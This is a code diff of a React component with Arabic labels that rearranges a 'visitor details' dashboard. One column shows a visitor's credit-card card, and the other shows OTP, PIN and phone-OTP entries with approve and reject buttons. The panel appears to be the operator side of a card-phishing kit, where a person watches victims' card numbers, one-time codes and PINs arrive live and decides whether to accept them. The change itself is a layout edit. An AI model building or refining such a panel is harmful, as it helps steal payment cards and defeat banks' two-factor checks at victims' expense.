@@ -544,27 +544,8 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             </div>
           </div>
           
-          {/* Layout Toggle & Navigation */}
+          {/* Navigation */}
           <div className="flex items-center gap-3">
-            {/* Layout Toggle */}
-            <button
-              onClick={() => setCardsLayout(cardsLayout === "vertical" ? "horizontal" : "vertical")}
-              className="px-4 py-2 border border-gray-300 rounded-lg bg-white text-sm hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-blue-500 flex items-center gap-2"
-              title={cardsLayout === "vertical" ? "عرض أفقي" : "عرض عمودي"}
-            >
-              {cardsLayout === "vertical" ? (
-                <>
-                  <span>📊</span>
-                  <span className="hidden md:inline">عمودي</span>
-                </>
-              ) : (
-                <>
-                  <span>📈</span>
-                  <span className="hidden md:inline">أفقي</span>
-                </>
-              )}
-            </button>
-            
             {/* Navigation Dropdown */}
             <select
               onChange={(e) => handleNavigate(e.target.value)}
@@ -593,8 +574,10 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             <p>لا توجد بيانات لعرضها</p>
           </div>
         ) : (
-          <div className={cardsLayout === "horizontal" ? "grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3" : "flex flex-col gap-3 max-w-md mx-auto w-full"} dir="rtl">
-          {sortedBubbles.map((bubble) => (
+          <div className="grid grid-cols-1 lg:grid-cols-2 gap-4" dir="rtl">
+            {/* Left Column - Credit Card Only */}
+            <div className="flex flex-col gap-3">
+              {sortedBubbles.filter(b => b.id === "card-info").map((bubble) => (
             <DataBubble
               key={bubble.id}
               title={bubble.title}
@@ -603,7 +586,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
               status={bubble.status}
               showActions={bubble.showActions}
               isLatest={bubble.isLatest}
-              layout={cardsLayout}
+              layout="vertical"
               actions={
                 bubble.customActions ? bubble.customActions : bubble.showActions ? (
                   <div className="flex gap-2 mt-3">
@@ -676,10 +659,87 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
                       </>
                     )}
                   </div>
-                ) : undefined
+                ) : null
               }
             />
-          ))}
+              ))}
+            </div>
+
+            {/* Right Column - All Other Cards */}
+            <div className="flex flex-col gap-3">
+              {sortedBubbles.filter(b => b.id !== "card-info").map((bubble) => (
+            <DataBubble
+              key={bubble.id}
+              title={bubble.title}
+              data={bubble.data}
+              timestamp={bubble.timestamp}
+              status={bubble.status}
+              showActions={bubble.showActions}
+              isLatest={bubble.isLatest}
+              layout="vertical"
+              actions={
+                bubble.customActions ? bubble.customActions : bubble.showActions ? (
+                  <div className="flex gap-2 mt-3">
+                    {bubble.type === "otp" && (
+                      <>
+                        <button
+                          onClick={() => handleBubbleAction(bubble.id, "approve")}
+                          disabled={isProcessing}
+                          className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-green-600 text-white rounded-lg text-xs md:text-sm hover:bg-green-700 disabled:opacity-50 font-medium"
+                        >
+                          ✓ قبول
+                        </button>
+                        <button
+                          onClick={() => handleBubbleAction(bubble.id, "reject")}
+                          disabled={isProcessing}
+                          className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-red-600 text-white rounded-lg text-xs md:text-sm hover:bg-red-700 disabled:opacity-50 font-medium"
+                        >
+                          ✗ رفض
+                        </button>
+                      </>
+                    )}
+                    {bubble.type === "pin" && (
+                      <>
+                        <button
+                          onClick={() => handleBubbleAction(bubble.id, "approve")}
+                          disabled={isProcessing}
+                          className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-green-600 text-white rounded-lg text-xs md:text-sm hover:bg-green-700 disabled:opacity-50 font-medium"
+                        >
+                          ✓ قبول
+                        </button>
+                        <button
+                          onClick={() => handleBubbleAction(bubble.id, "reject")}
+                          disabled={isProcessing}
+                          className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-red-600 text-white rounded-lg text-xs md:text-sm hover:bg-red-700 disabled:opacity-50 font-medium"
+                        >
+                          ✗ رفض
+                        </button>
+                      </>
+                    )}
+                    {bubble.type === "phone_otp" && (
+                      <>
+                        <button
+                          onClick={() => handleBubbleAction(bubble.id, "approve")}
+                          disabled={isProcessing}
+                          className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-green-600 text-white rounded-lg text-xs md:text-sm hover:bg-green-700 disabled:opacity-50 font-medium"
+                        >
+                          ✓ قبول
+                        </button>
+                        <button
+                          onClick={() => handleBubbleAction(bubble.id, "reject")}
+                          disabled={isProcessing}
+                          className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-red-600 text-white rounded-lg text-xs md:text-sm hover:bg-red-700 disabled:opacity-50 font-medium"
+                        >
+                          ✗ رفض
+                        </button>
+                      </>
+                    )}
+                  </div>
+                ) : null
+              }
+            />
+              ))}
+            </div>
           </div>
         )}
       </div>
